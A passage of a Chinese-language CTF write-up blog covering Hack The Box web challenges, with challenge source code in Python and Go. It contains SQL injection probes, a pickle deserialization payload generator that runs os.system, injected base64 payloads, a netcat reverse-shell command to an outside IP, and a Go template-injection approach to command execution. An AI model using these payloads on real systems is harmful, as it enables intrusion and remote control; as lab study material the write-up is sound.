class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from flask import g</span><br><span class=\"line\">from application import app</span><br><span class=\"line\">from sqlite3 import dbapi2 as sqlite3</span><br><span class=\"line\">import base64, pickle</span><br><span class=\"line\"></span><br><span class=\"line\">def connect_db():</span><br><span class=\"line\">    return sqlite3.connect(&#x27;cop.db&#x27;, isolation_level=None)</span><br><span class=\"line\">    </span><br><span class=\"line\">def get_db():</span><br><span class=\"line\">    db = getattr(g, &#x27;_database&#x27;, None)</span><br><span class=\"line\">    if db is None:</span><br><span class=\"line\">        db = g._database = connect_db()</span><br><span class=\"line\">        db.row_factory = sqlite3.Row</span><br><span class=\"line\">    return db</span><br><span class=\"line\"></span><br><span class=\"line\">def query_db(query, args=(), one=False):</span><br><span class=\"line\">    with app.app.app_context():</span><br><span class=\"line\">        cur = get_db().execute(query, args)</span><br><span class=\"line\">        rv = [dict((cur.description[idx][0], value) \\</span><br><span class=\"line\">            for idx, value in enumerate(row)) for row in cur.fetchall()]</span><br><span class=\"line\">        return (next(iter(rv[0].values())) if rv else None) if one else rv</span><br><span class=\"line\"></span><br><span class=\"line\">class Item:</span><br><span class=\"line\">\tdef __init__(self, name, description, price, image):</span><br><span class=\"line\">\t\tself.name = name</span><br><span class=\"line\">\t\tself.description = description</span><br><span class=\"line\">\t\tself.image = image</span><br><span class=\"line\">\t\tself.price = price</span><br><span class=\"line\"></span><br><span class=\"line\">def migrate_db():</span><br><span class=\"line\">    items = [</span><br><span class=\"line\">        Item(&#x27;Pickle Shirt&#x27;, &#x27;Get our new pickle shirt!&#x27;, &#x27;23&#x27;, &#x27;/static/images/pickle_shirt.jpg&#x27;),</span><br><span class=\"line\">        Item(&#x27;Pickle Shirt 2&#x27;, &#x27;Get our (second) new pickle shirt!&#x27;, &#x27;27&#x27;, &#x27;/static/images/pickle_shirt2.jpg&#x27;),</span><br><span class=\"line\">        Item(&#x27;Dill Pickle Jar&#x27;, &#x27;Literally just a pickle&#x27;, &#x27;1337&#x27;, &#x27;/static/images/pickle.jpg&#x27;),</span><br><span class=\"line\">        Item(&#x27;Branston Pickle&#x27;, &#x27;Does this even fit on our store?!?!&#x27;, &#x27;7.30&#x27;, &#x27;/static/images/branston_pickle.jpg&#x27;)</span><br><span class=\"line\">    ]</span><br><span class=\"line\">    </span><br><span class=\"line\">    with open(&#x27;schema.sql&#x27;, mode=&#x27;r&#x27;) as f:</span><br><span class=\"line\">        shop = map(lambda x: base64.b64encode(pickle.dumps(x)).decode(), items)</span><br><span class=\"line\">        get_db().cursor().executescript(f.read().format(*list(shop)))</span><br></pre></td></tr></table></figure></p>\n<p>这个 sql 语句能直接产生 sql 注入，还有就是这个 pickle (泡菜) 看到 pickle 我们就能想到 python 的反序列化</p>\n<p>先去页面注入尝试一下</p>\n<p><img data-src=\"/pic/image-20231210134014962.png\" alt=\"image-20231210134014962\" /></p>\n<p>发现</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1&#x27;order by 1--+不报错</span><br><span class=\"line\">1&#x27;order by 2--+直接报错</span><br></pre></td></tr></table></figure></p>\n<p>那直接使用 sqlmap 跑一次试试，发现使用的是 SQLite 数据库，那么我们就无法直接进行读取文件了，因为 sqlite 无法直接 --os-shell，这些表里也没有其他内容，那么进攻点就还有 pickle 了</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shop = map(lambda x: base64.b64encode(pickle.dumps(x)).decode(), items)</span><br></pre></td></tr></table></figure></p>\n<p>按照这个思路的话可以构造执行 shell 命令拼接 sql 语句，无效化前面的商品，利用 union select 能够直接将反序列化的代码传入</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import pickle</span><br><span class=\"line\">import base64</span><br><span class=\"line\">import os</span><br><span class=\"line\"></span><br><span class=\"line\">payload = &#x27;cp flag.txt application/static/.&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">class RCE:</span><br><span class=\"line\">    def __reduce__(self):</span><br><span class=\"line\">        return os.system, (payload,)</span><br><span class=\"line\"></span><br><span class=\"line\">if __name__ == &#x27;__main__&#x27;:</span><br><span class=\"line\">    print(base64.b64encode(pickle.dumps(RCE())))</span><br></pre></td></tr></table></figure></p>\n<p>需要注意的点是这段代码需要使用 linux 运行，因为 windows 运行的 base64 编码后和 linux 的不一样</p>\n<p>如</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">windows:gASVOAAAAAAAAACMAm50lIwGc3lzdGVtlJOUjCBjcCBmbGFnLnR4dCBhcHBsaWNhdGlvbi9zdGF0aWMvLpSFlFKULg==</span><br><span class=\"line\">linux:gASVOwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjCBjcCBmbGFnLnR4dCBhcHBsaWNhdGlvbi9zdGF0aWMvLpSFlFKULg==</span><br></pre></td></tr></table></figure></p>\n<p>然后利用</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x27; union select &#x27;gASVOwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjCBjcCBmbGFnLnR4dCBhcHBsaWNhdGlvbi9zdGF0aWMvLpSFlFKULg==</span><br><span class=\"line\">或者&#x27; union select &#x27;gASVOwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjCBjcCBmbGFnLnR4dCBhcHBsaWNhdGlvbi9zdGF0aWMvLpSFlFKULg== &#x27;--+</span><br></pre></td></tr></table></figure></p>\n<p>在访问 /static/flag.txt 即可得到 flag</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import pickle</span><br><span class=\"line\">import base64</span><br><span class=\"line\">import os</span><br><span class=\"line\"></span><br><span class=\"line\">payload = &#x27;nc 172.25.36.114 8888 -e /bin/bash&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">class RCE:</span><br><span class=\"line\">    def __reduce__(self):</span><br><span class=\"line\">        return os.system, (payload,)</span><br><span class=\"line\"></span><br><span class=\"line\">if __name__ == &#x27;__main__&#x27;:</span><br><span class=\"line\">    print(base64.urlsafe_b64encode(pickle.dumps(RCE())).decode(&#x27;ascii&#x27;))</span><br></pre></td></tr></table></figure></p>\n<p>在使用相同的办法直接进行反弹 shell，注意这样只能在本地才行</p>\n<h3 id=\"renderquest\"><a class=\"anchor\" href=\"#renderquest\">#</a> RenderQuest</h3>\n<p>很棒的一题，这题让我理解了一下 golang 的模板渲染，首先查看 main.go 代码</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package main</span><br><span class=\"line\"></span><br><span class=\"line\">import (</span><br><span class=\"line\">\t&quot;encoding/json&quot;</span><br><span class=\"line\">\t&quot;fmt&quot;</span><br><span class=\"line\">\t&quot;html/template&quot;</span><br><span class=\"line\">\t&quot;io&quot;</span><br><span class=\"line\">\t&quot;net/http&quot;</span><br><span class=\"line\">\t&quot;os&quot;</span><br><span class=\"line\">\t&quot;os/exec&quot;</span><br><span class=\"line\">\t&quot;path/filepath&quot;</span><br><span class=\"line\">\t&quot;strings&quot;</span><br><span class=\"line\">)</span><br><span class=\"line\"></span><br><span class=\"line\">const WEB_PORT = &quot;1337&quot;</span><br><span class=\"line\">const TEMPLATE_DIR = &quot;./templates&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">type LocationInfo struct &#123;</span><br><span class=\"line\">\tIpVersion     int     `json:&quot;ipVersion&quot;`</span><br><span class=\"line\">\tIpAddress     string  `json:&quot;ipAddress&quot;`</span><br><span class=\"line\">\tLatitude      float64 `json:&quot;latitude&quot;`</span><br><span class=\"line\">\tLongitude     float64 `json:&quot;longitude&quot;`</span><br><span class=\"line\">\tCountryName   string  `json:&quot;countryName&quot;`</span><br><span class=\"line\">\tCountryCode   string  `json:&quot;countryCode&quot;`</span><br><span class=\"line\">\tTimeZone      string  `json:&quot;timeZone&quot;`</span><br><span class=\"line\">\tZipCode       string  `json:&quot;zipCode&quot;`</span><br><span class=\"line\">\tCityName      string  `json:&quot;cityName&quot;`</span><br><span class=\"line\">\tRegionName    string  `json:&quot;regionName&quot;`</span><br><span class=\"line\">\tContinent     string  `json:&quot;continent&quot;`</span><br><span class=\"line\">\tContinentCode string  `json:&quot;continentCode&quot;`</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">type MachineInfo struct &#123;</span><br><span class=\"line\">\tHostname      string</span><br><span class=\"line\">\tOS            string</span><br><span class=\"line\">\tKernelVersion string</span><br><span class=\"line\">\tMemory        string</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">type RequestData struct &#123;</span><br><span class=\"line\">\tClientIP     string</span><br><span class=\"line\">\tClientUA     string</span><br><span class=\"line\">\tServerInfo   MachineInfo</span><br><span class=\"line\">\tClientIpInfo LocationInfo `json:&quot;location&quot;`</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">func (p RequestData) FetchServerInfo(command string) string &#123;</span><br><span class=\"line\">\tout, err := exec.Command(&quot;sh&quot;, &quot;-c&quot;, command).Output()</span><br><span class=\"line\">\tif err != nil &#123;</span><br><span class=\"line\">\t\treturn &quot;&quot;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\treturn string(out)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">func (p RequestData) GetLocationInfo(endpointURL string) (*LocationInfo, error) &#123;</span><br><span class=\"line\">\tresp, err := http.Get(endpointURL)</span><br><span class=\"line\">\tif err != nil &#123;</span><br><span class=\"line\">\t\treturn nil, err</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tdefer resp.Body.Close()</span><br><span class=\"line\"></span><br><span class=\"line\">\tif resp.StatusCode != http.StatusOK &#123;</span><br><span class=\"line\">\t\treturn nil, fmt.Errorf(&quot;HTTP request failed with status code: %d&quot;, resp.StatusCode)</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tbody, err := io.ReadAll(resp.Body)</span><br><span class=\"line\">\tif err != nil &#123;</span><br><span class=\"line\">\t\treturn nil, err</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tvar locationInfo LocationInfo</span><br><span class=\"line\">\tif err := json.Unmarshal(body, &amp;locationInfo); err != nil &#123;</span><br><span class=\"line\">\t\treturn nil, err</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\treturn &amp;locationInfo, nil</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">func isSubdirectory(basePath, path string) bool &#123;</span><br><span class=\"line\">\trel, err := filepath.Rel(basePath, path)</span><br><span class=\"line\">\tif err != nil &#123;</span><br><span class=\"line\">\t\treturn false</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\treturn !strings.HasPrefix(rel, &quot;..&quot;+string(filepath.Separator))</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">func readFile(filepath string, basePath string) (string, error) &#123;</span><br><span class=\"line\">\tif !isSubdirectory(basePath, filepath) &#123;</span><br><span class=\"line\">\t\treturn &quot;&quot;, fmt.Errorf(&quot;Invalid filepath&quot;)</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tdata, err := os.ReadFile(filepath)</span><br><span class=\"line\">\tif err != nil &#123;</span><br><span class=\"line\">\t\treturn &quot;&quot;, err</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\treturn string(data), nil</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">func readRemoteFile(url string) (string, error) &#123;</span><br><span class=\"line\">\tresponse, err := http.Get(url)</span><br><span class=\"line\">\tif err != nil &#123;</span><br><span class=\"line\">\t\treturn &quot;&quot;, err</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tdefer response.Body.Close()</span><br><span class=\"line\"></span><br><span class=\"line\">\tif response.StatusCode != http.StatusOK &#123;</span><br><span class=\"line\">\t\treturn &quot;&quot;, fmt.Errorf(&quot;HTTP request failed with status code: %d&quot;, response.StatusCode)</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tcontent, err := io.ReadAll(response.Body)</span><br><span class=\"line\">\tif err != nil &#123;</span><br><span class=\"line\">\t\treturn &quot;&quot;, err</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\treturn string(content), nil</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">func getIndex(w http.ResponseWriter, r *http.Request) &#123;</span><br><span class=\"line\">\thttp.Redirect(w, r, &quot;/render?page=index.tpl&quot;, http.StatusMovedPermanently)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">func getTpl(w http.ResponseWriter, r *http.Request) &#123;</span><br><span class=\"line\">\tvar page string = r.URL.Query().Get(&quot;page&quot;)</span><br><span class=\"line\">\tvar remote string = r.URL.Query().Get(&quot;use_remote&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">\tif page == &quot;&quot; &#123;</span><br><span class=\"line\">\t\thttp.Error(w, &quot;Missing required parameters&quot;, http.StatusBadRequest)</span><br><span class=\"line\">\t\treturn</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\treqData := &amp;RequestData&#123;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tuserIPCookie, err := r.Cookie(&quot;user_ip&quot;)</span><br><span class=\"line\">\tclientIP := &quot;&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">\tif err == nil &#123;</span><br><span class=\"line\">\t\tclientIP = userIPCookie.Value</span><br><span class=\"line\">\t&#125; else &#123;</span><br><span class=\"line\">\t\tclientIP = strings.Split(r.RemoteAddr, &quot;:&quot;)[0]</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tuserAgent := r.Header.Get(&quot;User-Agent&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">\tlocationInfo, err := reqData.GetLocationInfo(&quot;https://freeipapi.com/api/json/&quot; + clientIP)</span><br><span class=\"line\"></span><br><span class=\"line\">\tif err != nil &#123;</span><br><span class=\"line\">\t\tfmt.Println(err)</span><br><span class=\"line\">\t\thttp.Error(w, &quot;Could not fetch IP location info&quot;, http.StatusInternalServerError)</span><br><span class=\"line\">\t\treturn</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\treqData.ClientIP = clientIP</span><br><span class=\"line\">\treqData.ClientUA = userAgent</span><br><span class=\"line\">\treqData.ClientIpInfo = *locationInfo</span><br><span class=\"line\">\treqData.ServerInfo.Hostname = reqData.FetchServerInfo(&quot;hostname&quot;)</span><br><span class=\"line\">\treqData.ServerInfo.OS = reqData.FetchServerInfo(&quot;cat /etc/os-release | grep PRETTY_NAME | cut -d &#x27;\\&quot;&#x27; -f 2&quot;)</span><br><span class=\"line\">\treqData.ServerInfo.KernelVersion = reqData.FetchServerInfo(&quot;uname -r&quot;)</span><br><span class=\"line\">\treqData.ServerInfo.Memory = reqData.FetchServerInfo(&quot;free -h | awk &#x27;/^Mem/&#123;print $2&#125;&#x27;&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">\tvar tmplFile string</span><br><span class=\"line\"></span><br><span class=\"line\">\tif remote == &quot;true&quot; &#123;</span><br><span class=\"line\">\t\ttmplFile, err = readRemoteFile(page)</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tif err != nil &#123;</span><br><span class=\"line\">\t\t\thttp.Error(w, &quot;Internal Server Error&quot;, http.StatusInternalServerError)</span><br><span class=\"line\">\t\t\treturn</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125; else &#123;</span><br><span class=\"line\">\t\ttmplFile, err = readFile(TEMPLATE_DIR+&quot;/&quot;+page, &quot;./&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tif err != nil &#123;</span><br><span class=\"line\">\t\t\thttp.Error(w, &quot;Internal Server Error&quot;, http.StatusInternalServerError)</span><br><span class=\"line\">\t\t\treturn</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\ttmpl, err := template.New(&quot;page&quot;).Parse(tmplFile)</span><br><span class=\"line\">\tif err != nil &#123;</span><br><span class=\"line\">\t\thttp.Error(w, &quot;Internal Server Error&quot;, http.StatusInternalServerError)</span><br><span class=\"line\">\t\treturn</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\terr = tmpl.Execute(w, reqData)</span><br><span class=\"line\">\tif err != nil &#123;</span><br><span class=\"line\">\t\thttp.Error(w, &quot;Internal Server Error&quot;, http.StatusInternalServerError)</span><br><span class=\"line\">\t\treturn</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">func main() &#123;</span><br><span class=\"line\">\tmux := http.NewServeMux()</span><br><span class=\"line\"></span><br><span class=\"line\">\tmux.HandleFunc(&quot;/&quot;, getIndex)</span><br><span class=\"line\">\tmux.HandleFunc(&quot;/render&quot;, getTpl)</span><br><span class=\"line\">\tmux.Handle(&quot;/static/&quot;, http.StripPrefix(&quot;/static/&quot;, http.FileServer(http.Dir(&quot;static&quot;))))</span><br><span class=\"line\"></span><br><span class=\"line\">\tfmt.Println(&quot;Server started at port &quot; + WEB_PORT)</span><br><span class=\"line\">\thttp.ListenAndServe(&quot;:&quot;+WEB_PORT, mux)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\n<p>其他的不看光看调用包就可以找到我们需要的漏洞，import 了一个 os 并且在</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">func (p RequestData) FetchServerInfo(command string) string &#123;</span><br><span class=\"line\">\tout, err := exec.Command(&quot;sh&quot;, &quot;-c&quot;, command).Output()</span><br><span class=\"line\">\tif err != nil &#123;</span><br><span class=\"line\">\t\treturn &quot;&quot;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\treturn string(out)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>这里调用了一个 exec.Command 并且是调用的 sh -c 就是命令执行的意思，</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">You&#x27;ve found a website that lets you input remote templates for rendering. Your task is to exploit this system&#x27;s vulnerabilities to access and retrieve a hidden flag. Good luck!</span><br></pre></td></tr></table></figure></p>\n<p>这里也说明了模板渲染，那抓包查看下面的<img data-src=\"/pic/image-20231210145451007.png\" alt=\"image-20231210145451007\" /></p>\n<p>这个页面的下面还能跳转我们要的网页，</p>\n<p><img data-src=\"/pic/image-20231210145537106.png\" alt=\"image-20231210145537106\" /></p>\n<p>这里使用的抓包可以知道 use_remote=true 并且 page 就是你需要立即渲染的地方，因为内网 ip 无法访问那么我们可以使用 webhook.site 来生成需要的内容接取</p>\n<p><img data-src=\"/pic/image-20231210145732624.png\" alt=\"image-20231210145732624\" /></p>\n<p>这里调用了.FetchServerInfo 来直接执行命令，因为我们的目标就是这个</p>\n<p><img data-src=\"/pic/image-20231210145837130.png\" alt=\"image-20231210145837130\" /></p>\n<p>命令执行成功，达到目的</p>\n<h3 id=\"apacheblaze\"><a class=\"anchor\" href=\"#apacheblaze\">#</a> ApacheBlaze</h3>\n<p>Step into the ApacheBlaze universe, a world of arcade clicky games. Rumor has it that by playing certain games, you have the chance to win a grand prize. However, before you can dive into the fun, you'll need to crack a puzzle.</p>\n<p>这个题打的我很懵</p>\n<p>我看了一下 app.py 里面的代码</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from flask import Flask, request, jsonify</span><br><span class=\"line\"></span><br><span class=\"line\">app = Flask(__name__)</span><br><span class=\"line\"></span><br><span class=\"line\">app.config[&#x27;GAMES&#x27;] = &#123;&#x27;magic_click&#x27;, &#x27;click_mania&#x27;, &#x27;hyper_clicker&#x27;, &#x27;click_topia&#x27;&#125;</span><br><span class=\"line\">app.config[&#x27;FLAG&#x27;] = &#x27;HTB&#123;f4k3_fl4g_f0r_t3st1ng&#125;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;])</span><br><span class=\"line\">def index():</span><br><span class=\"line\">    game = request.args.get(&#x27;game&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">    if not game:</span><br><span class=\"line\">        return jsonify(&#123;</span><br><span class=\"line\">            &#x27;error&#x27;: &#x27;Empty game name is not supported!.&#x27;</span><br><span class=\"line\">        &#125;), 400</span><br><span class=\"line\"></span><br><span class=\"line\">    elif game not in app.config[&#x27;GAMES&#x27;]:</span><br><span class=\"line\">        return jsonify(&#123;</span><br><span class=\"line\">            &#x27;error&#x27;: &#x27;Invalid game name!&#x27;</span><br><span class=\"line\">        &#125;), 400</span><br><span class=\"line\"></span><br><span class=\"line\">    elif game == &#x27;click_topia&#x27;:</span><br><span class=\"line\">        if 